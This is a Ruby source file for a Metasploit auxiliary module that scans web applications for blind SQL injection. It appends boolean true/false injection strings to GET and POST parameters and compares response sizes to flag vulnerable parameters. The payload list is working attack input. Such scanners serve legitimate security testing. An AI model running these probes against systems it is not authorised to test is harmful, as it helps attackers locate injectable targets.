##
# $Id: blind_sql_query.rb 14735 2012-02-17 09:36:04Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'




class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanUniqueQuery
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report


	def initialize(info = {})
		super(update_info(info,
			'Name'   		=> 'HTTP Blind SQL Injection Scanner',
			'Description'	=> %q{
				This module identifies the existence of Blind SQL injection issues
				in GET/POST Query parameters values.
			},
			'Author' 		=> [ 'et [at] cyberspace.org' ],
			'License'		=> BSD_LICENSE,
			'Version'		=> '$Revision: 14735 $'))

		register_options(
			[
				OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
				OptString.new('PATH', [ true,  "The path/file to test SQL injection", '/index.asp']),
				OptString.new('QUERY', [ false,  "HTTP URI Query", '']),
				OptString.new('DATA', [ false, "HTTP Body Data", '']),
				OptString.new('COOKIE',[ false, "HTTP Cookies", ''])
			], self.class)

	end

	def run_host(ip)
		# Force http verb to be upper-case, because otherwise some web servers such as
		# Apache might throw you a 501
		http_method = datastore['METHOD'].upcase
 
		gvars = Hash.new()
		pvars = Hash.new()
		cvars = Hash.new()

		rnum=rand(10000)

		valstr = [
			[ 'numeric',
			" AND #{rnum}=#{rnum} ",
			" AND #{rnum}=#{rnum+1} "
			],
			[ 'single quotes',
			"' AND '#{rnum}'='#{rnum}",
			"' AND '#{rnum}'='#{rnum+1}"
			],
			[ 'double quotes',
			"\" AND \"#{rnum}\"=\"#{rnum}",
			"\" AND \"#{rnum}\"=\"#{rnum+1}"
			],
			[ 'OR single quotes uncommented',
			"' OR '#{rnum}'='#{rnum}",
			"' OR '#{rnum}'='#{rnum+1}"
			],
			[ 'OR single quotes closed and commented',
			"' OR '#{rnum}'='#{rnum}'--",
			"' OR '#{rnum}'='#{rnum+1}'--"
			],
			[ 'hex encoded OR single quotes uncommented',
			"'%20OR%20'#{rnum}'%3D'#{rnum}",
			"'%20OR%20'#{rnum}'%3D'#{rnum+1}"
			],
			[ 'hex encoded OR single quotes closed and commented',
			"'%20OR%20'#{rnum}'%3D'#{rnum}'--",
			"'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
			]
		]

		#
		# Dealing with empty query/data and making them hashes.
		#

		if  !datastore['QUERY'] or datastore['QUERY'].empty?
			datastore['QUERY'] = nil
			gvars = nil
		else
			gvars = queryparse(datastore['QUERY']) #Now its a Hash
		end

		if  !datastore['DATA'] or datastore['DATA'].empty?
			datastore['DATA'] = nil
			pvars = nil
		else
			pvars = queryparse(datastore['DATA'])
		end

		if  !datastore['COOKIE'] or datastore['COOKIE'].empty?
			datastore['COOKIE'] = nil
			cvars = nil
		else
			cvars = queryparse(datastore['COOKIE'])
		end


		#SEND NORMAL REQUEST
		begin
			normalres = send_request_cgi({
				'uri'  		=> datastore['PATH'],
				'vars_get' 	=> gvars,
				'method'   	=> http_method,
				'ctype'		=> 'application/x-www-form-urlencoded',
				'cookie'    => datastore['COOKIE'],
				'data'      => datastore['DATA']
			}, 20)
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end

		sigtxt = ""

		if not normalres
			print_error("No response")
			return
		end

		pinj = false	

		valstr.each do |tarr|
			#QUERY
			if gvars
				gvars.each do |key,value|
					print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

					#SEND TRUE REQUEST
					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
					testgvars[key] = testgvars[key]+tarr[1]
					begin
						trueres = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'vars_get' 	=>  testgvars,
							'method'   	=>  http_method,
							'ctype'		=> 'application/x-www-form-urlencoded',
							'cookie'    => datastore['COOKIE'],
							'data'      => datastore['DATA']
						}, 20)
					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					rescue ::Timeout::Error, ::Errno::EPIPE
					end
				
					#SEND FALSE REQUEST
					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
					testgvars[key] = testgvars[key]+tarr[2]
					begin
						falseres = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'vars_get' 	=>  testgvars,
							'method'   	=>  http_method,
							'ctype'		=> 'application/x-www-form-urlencoded',
							'cookie'    => datastore['COOKIE'],
							'data'      => datastore['DATA']
						}, 20)
					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					rescue ::Timeout::Error, ::Errno::EPIPE
					end		
	
					pinj = detection_a(normalres,trueres,falseres,tarr)
					
					if pinj
						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
						
						report_web_vuln(
							:host	=> ip,
							:port	=> rport,
							:vhost  => vhost,
							:ssl    => ssl,
							:path	=> "#{datastore['PATH']}",
							:method => http_method,
							:pname  => "#{key}",
							:proof  => "blind sql inj.",
							:risk   => 2,
							:confidence   => 50,
							:category     => 'SQL injection',
							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
							:name   => 'Blind SQL injection'
						)
						pinj = false
					else
						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
					end
					
					pinj = detection_b(normalres,trueres,falseres,tarr)
					
					if pinj
						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
						
						report_web_vuln(
							:host	=> ip,
							:port	=> rport,
							:vhost  => vhost,
							:ssl    => ssl,
							:path	=> "#{datastore['PATH']}",
							:method => http_method,
							:pname  => "#{key}",
							:proof  => "blind sql inj.",
							:risk   => 2,
							:confidence   => 50,
							:category     => 'SQL injection',
							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
							:name   => 'Blind SQL injection'
						)
						pinj = false
					else
						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
					end
				end
			end
			
			#DATA
			if pvars
				pvars.each do |key,value|
					print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

					#SEND TRUE REQUEST
					testpvars = queryparse(datastore['DATA']) #Now its a Hash
					testpvars[key] = testpvars[key]+tarr[1]

					pvarstr = ""
					testpvars.each do |tkey,tvalue|
						if pvarstr
							pvarstr << '&'
						end
						pvarstr << tkey+'='+tvalue
					end

					begin
						trueres = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'vars_get' 	=>  gvars,
							'method'   	=>  http_method,
							'ctype'		=> 'application/x-www-form-urlencoded',
							'cookie'    => datastore['COOKIE'],
							'data'      => pvarstr
						}, 20)
					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					rescue ::Timeout::Error, ::Errno::EPIPE
					end
					
					#SEND FALSE REQUEST
					testpvars = queryparse(datastore['DATA']) #Now its a Hash
					testpvars[key] = testpvars[key]+tarr[2]

					pvarstr = ""
					testpvars.each do |tkey,tvalue|
						if pvarstr
							pvarstr << '&'
						end
						pvarstr << tkey+'='+tvalue
					end

					begin
						falseres = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'vars_get' 	=>  gvars,
							'method'   	=>  http_method,
							'ctype'		=> 'application/x-www-form-urlencoded',
							'cookie'    => datastore['COOKIE'],
							'data'      => pvarstr
						}, 20)
					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					rescue ::Timeout::Error, ::Errno::EPIPE
					end	

					pinj = detection_a(normalres,trueres,falseres,tarr)
					
					if pinj
						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
						
						report_web_vuln(
							:host	=> ip,
							:port	=> rport,
							:vhost  => vhost,
							:ssl    => ssl,
							:path	=> "#{datastore['PATH']}",
							:method => http_method,
							:pname  => "#{key}",
							:proof  => "blind sql inj.",
							:risk   => 2,
							:confidence   => 50,
							:category     => 'SQL injection',
							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
							:name   => 'Blind SQL injection'
						)
						pinj = false
					else
						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
					end
					
					pinj = detection_b(normalres,trueres,falseres,tarr)
					
					if pinj
						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
						
						report_web_vuln(
							:host	=> ip,
							:port	=> rport,
							:vhost  => vhost,
							:ssl    => ssl,
							:path	=> "#{datastore['PATH']}",
							:method => http_method,
							:pname  => "#{key}",
							:proof  => "blind sql inj.",
							:risk   => 2,
							:confidence   => 50,
							:category     => 'SQL injection',
							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
							:name   => 'Blind SQL injection'
						)
						pinj = false
					else
						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
					end
				end
			end
		end
	end
	
	def detection_a(normalr,truer,falser,tarr)
		# print_status("A")
			
		# DETECTION A
		# Very simple way to compare responses, this can be improved alot , at this time just the simple way
		
		if normalr and truer
			#Very simple way to compare responses, this can be improved alot , at this time just the simple way
			reltruesize = truer.body.length-(truer.body.scan(/#{tarr[1]}/).length*tarr[1].length)
			normalsize = normalr.body.length
			
			#print_status("normalsize #{normalsize} truesize #{reltruesize}")
			
			if reltruesize == normalsize
				if falser
					relfalsesize = falser.body.length-(falser.body.scan(/#{tarr[2]}/).length*tarr[2].length)

					#print_status("falsesize #{relfalsesize}")	
					
					if reltruesize > relfalsesize
						return true
					else
						return false
					end
				else
					print_status("NO False Response.")
				end
			else
				print_status("Normal and True requests are different.")
			end
		else
			print_status("No response.")
		end
		
		return false
	end
	
	def detection_b(normalr,truer,falser,tarr)
		# print_status("B")
			
		# DETECTION B
		# Variance on res body
		
		if normalr and truer 
			if falser
				#print_status("N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}")
			
				if (truer.body.length-tarr[1].length) != normalr.body.length and (falser.body.length-tarr[2].length) == normalr.body.length
					return true
				end
				if (truer.body.length-tarr[1].length) == normalr.body.length and (falser.body.length-tarr[2].length) != normalr.body.length
					return true
				end
			end
		end
		
		return false
	end
	
	def detection_c(normalr,truer,falser,tarr)
		# print_status("C")
			
		# DETECTION C
		# Variance on res code of true or false statements
		
		if normalr and truer 
			if falser
				if truer.code.to_i != normalr.code.to_i and falser.code.to_i == normalr.code.to_i
					return true
				end
				if truer.code.to_i == normalr.code.to_i and falser.code.to_i != normalr.code.to_i
					return true
				end
			end
		end
		
		return false
	end
end
